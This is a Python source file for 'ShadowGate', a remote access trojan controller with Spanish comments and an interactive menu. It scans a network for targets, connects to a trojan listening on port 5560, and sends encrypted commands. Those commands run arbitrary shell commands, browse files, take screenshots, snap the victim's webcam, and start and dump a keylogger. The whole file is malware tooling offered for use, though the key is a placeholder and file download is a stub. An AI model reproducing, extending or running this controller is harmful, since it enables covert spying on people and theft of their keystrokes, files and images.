#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
import threading
from cryptography.fernet import Fernet
from termcolor import colored
import pyfiglet
import os


class ShadowGateController:
    def __init__(self):
        self.target_ip = None
        self.socket = None
        self.connected = False
        self.encryption_key = b'your_encryption_key_here'  # ← Misma clave que el troyano
        self.cipher = Fernet(self.encryption_key)

    def connect(self, target_ip):
        """Conectar al objetivo"""
        try:
            self.target_ip = target_ip
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((target_ip, 5560))  # Puerto del troyano
            self.connected = True
            print(colored(f"✅ Conectado a {target_ip}", 'green'))
            return True
        except Exception as e:
            print(colored(f"❌ Error conectando: {e}", 'red'))
            return False

    def send_command(self, command_type, data=None):
        """Enviar comando cifrado"""
        if not self.connected:
            print(colored("❌ No conectado", 'red'))
            return None

        try:
            command = {
                'type': command_type,
                'data': data or {},
                'timestamp': 'now'
            }

            # Cifrar comando
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())

            # Enviar
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)

            # Recibir respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return None

            size = struct.unpack('!I', size_data)[0]
            response_data = self.socket.recv(size)

            # Descifrar respuesta
            decrypted_response = self.cipher.decrypt(response_data)
            return json.loads(decrypted_response.decode())

        except Exception as e:
            print(colored(f"❌ Error: {e}", 'red'))
            return None

    def execute_command(self, cmd):
        """Ejecutar comando en el objetivo"""
        return self.send_command('system_cmd', {'command': cmd})

    def get_system_info(self):
        """Obtener información del sistema"""
        return self.execute_command("systeminfo")

    def file_explorer(self, path="C:\\"):
        """Explorar archivos"""
        return self.execute_command(f"dir \"{path}\"")

    def download_file(self, remote_path, local_path):
        """Descargar archivo"""
        # Implementar transferencia de archivos
        pass

    def take_screenshot(self):
        """Capturar pantalla"""
        return self.send_command('screenshot')

    def webcam_capture(self):
        """Capturar de webcam"""
        return self.send_command('webcam_snap')

    def keylogger_start(self):
        """Iniciar keylogger"""
        return self.send_command('keylogger', {'action': 'start'})

    def keylogger_dump(self):
        """Obtener logs del keylogger"""
        return self.send_command('keylogger', {'action': 'dump'})

    def show_banner(self):
        """Mostrar banner"""
        banner = pyfiglet.figlet_format("SHADOWGATE", font="slant")
        print(colored(banner, 'cyan'))
        print(colored("🕶️  Remote Control System", 'yellow'))
        print("=" * 60)

    def interactive_menu(self):
        """Menú interactivo"""
        self.show_banner()

        while True:
            print("\n" + "=" * 50)
            print(colored("🎮 MENÚ DE CONTROL", 'magenta'))
            print("=" * 50)

            if self.target_ip:
                print(colored(f"Objetivo: {self.target_ip}", 'green'))
            else:
                print(colored("Sin objetivo conectado", 'yellow'))

            print("1. 🔍 Escanear red")
            print("2. 📡 Conectar a objetivo")
            print("3. 🖥️  Información del sistema")
            print("4. 📁 Explorar archivos")
            print("5. 📸 Capturar pantalla")
            print("6. ⌨️  Keylogger (iniciar)")
            print("7. 📝 Keylogger (ver logs)")
            print("8. 📹 Webcam snap")
            print("9. 🚪 Desconectar")
            print("0. 🏃 Salir")
            print("=" * 50)

            choice = input("👉 Selecciona opción: ").strip()

            if choice == "1":
                from network_scanner import find_targets
                targets = find_targets()
                if targets:
                    print("Objetivos:", targets)

            elif choice == "2":
                target = input("IP del objetivo: ").strip()
                self.connect(target)

            elif choice == "3" and self.connected:
                result = self.get_system_info()
                if result and result.get('success'):
                    print(colored("🖥️  System Info:", 'green'))
                    print(result.get('output', ''))

            elif choice == "4" and self.connected:
                path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
                result = self.file_explorer(path)
                if result and result.get('success'):
                    print(colored(f"📁 Contenido de {path}:", 'green'))
                    print(result.get('output', ''))

            elif choice == "5" and self.connected:
                print(colored("📸 Capturando pantalla...", 'yellow'))
                result = self.take_screenshot()
                if result and result.get('success'):
                    print("✅ Captura realizada")

            elif choice == "6" and self.connected:
                result = self.keylogger_start()
                if result and result.get('success'):
                    print("✅ Keylogger iniciado")

            elif choice == "7" and self.connected:
                result = self.keylogger_dump()
                if result and result.get('success'):
                    print("📝 Keystrokes capturados:")
                    print(result.get('data', ''))

            elif choice == "8" and self.connected:
                print(colored("📹 Capturando webcam...", 'yellow'))
                result = self.webcam_capture()
                if result and result.get('success'):
                    print("✅ Foto de webcam tomada")

            elif choice == "9":
                if self.socket:
                    self.socket.close()
                self.connected = False
                self.target_ip = None
                print(colored("🔌 Desconectado", 'yellow'))

            elif choice == "0":
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida", 'red'))

            input("\n📍 Presiona Enter para continuar...")


if __name__ == "__main__":
    controller = ShadowGateController()
    controller.interactive_menu()